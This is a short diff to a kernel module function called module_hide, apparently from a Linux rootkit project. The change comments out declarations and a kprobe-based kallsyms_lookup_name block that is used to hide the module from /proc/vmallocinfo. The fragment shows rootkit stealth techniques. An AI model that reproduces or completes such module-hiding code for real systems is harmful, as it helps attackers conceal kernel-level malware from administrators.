@@ -198,9 +198,9 @@ void module_hide(void) {
 
     // struct vmap_area *va, *vtmp;
     // struct module_use *use, *tmp;
-    struct list_head *_vmap_area_list;
-    struct rb_root *_vmap_area_root;
-
+    // struct list_head *_vmap_area_list;
+    // struct rb_root *_vmap_area_root;
+/*
 #ifdef KPROBE_LOOKUP
     unsigned long (*kallsyms_lookup_name)(const char *name);
     if (register_kprobe(&kp) < 0)
@@ -222,6 +222,7 @@ void module_hide(void) {
 	pr_info("[+] vmap noobs not found");
 	return;
    }
+   */
     /*
     // hidden from /proc/vmallocinfo 
     list_for_each_entry_safe (va, vtmp, _vmap_area_list, list) {
